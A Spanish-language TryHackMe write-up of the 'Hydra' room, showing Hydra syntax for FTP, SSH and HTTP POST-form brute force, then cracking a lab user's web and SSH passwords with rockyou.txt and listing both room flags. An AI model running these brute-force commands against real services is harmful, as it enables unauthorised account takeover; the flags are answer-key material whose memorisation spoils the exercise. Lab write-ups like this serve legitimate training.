---
title: "TryHackMe: Hydra"
category: "TryHackMe"
order: 17
tags: ["tryhackme", "hydra", "bruteforce", "ssh", "web-form"]
layout: layouts/writeup.njk
permalink: /writeups/thm-hydra.html
---

## ¿Qué es Hydra?

Hydra es una herramienta de crackeo de contraseñas — un login cracker de sistemas. Se instala fácilmente en sistemas basados en Ubuntu con `apt install hydra`.

## Comandos de Hydra

Las flags de Hydra dependen del servicio atacado. Por ejemplo, fuerza bruta a FTP con usuario `user` y lista de contraseñas `passlist.txt`:

```bash
hydra -l user -P passlist.txt ftp://10.10.188.44
```

### SSH

| Opción | Descripción |
|---|---|
| `-l` | Especifica el usuario para el login |
| `-P` | Indica la lista de contraseñas |
| `-t` | Configura el número de hilos |

```bash
hydra -l root -P passwords.txt 10.10.188.44 -t 4 ssh
```

### Formularios web (POST)

```bash
sudo hydra <username> <wordlist> 10.10.188.44 http-post-form "<path>:<login_credentials>:<invalid_response>"
```

| Opción | Descripción |
|---|---|
| `-l` | Usuario del login del formulario web |
| `-P` | Lista de contraseñas a usar |
| `http-post-form` | El tipo del form es POST |
| `<path>` | URL de la página de login, ej. `login.php` |
| `<login_credentials>` | Ej. `username=^USER^&password=^PASS^` |
| `<invalid_response>` | Parte de la respuesta cuando el login falla |
| `-V` | Verbosidad para el output |

```bash
hydra -l <username> -P <wordlist> 10.10.188.44 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

## Fuerza bruta al formulario web de Molly

```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.188.44 http-post-form "/login:username=^USER^&password=^PASS^:incorrect" -f -V
...
[80][http-post-form] host: 10.10.188.44   login: molly   password: sunshine
1 of 1 target successfully completed, 1 valid password found
```

Iniciando sesión con esas credenciales se obtiene la primera flag:

**Flag 1:** `THM{2673a7dd116de68e85c48ec0b1f2612e}`

## Fuerza bruta a SSH de Molly

```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.188.44 -V -t 4 ssh
...
[22][ssh] host: 10.10.188.44   login: molly   password: butterfly
1 of 1 target successfully completed, 1 valid password found
```

Conectando por SSH:

```bash
ssh molly@10.10.188.44
molly@10.10.188.44's password:
molly@ip-10-10-188-44:~$ cat flag2.txt
THM{c8eeb0468febbadea859baeb33b2541b}
```

**Flag 2:** `THM{c8eeb0468febbadea859baeb33b2541b}`

## Lecciones aprendidas

- Hydra se adapta a casi cualquier protocolo de autenticación (SSH, FTP, formularios HTTP POST/GET) con la sintaxis de módulo adecuada.
- Para formularios web es clave identificar el string de respuesta que indica login fallido (`F=incorrect`), ya que sin eso Hydra no puede distinguir un intento exitoso de uno fallido.
- Reutilización de contraseñas entre servicios (web y SSH) es un riesgo común — aquí ambas cuentas de Molly usaban contraseñas débiles presentes en `rockyou.txt`.
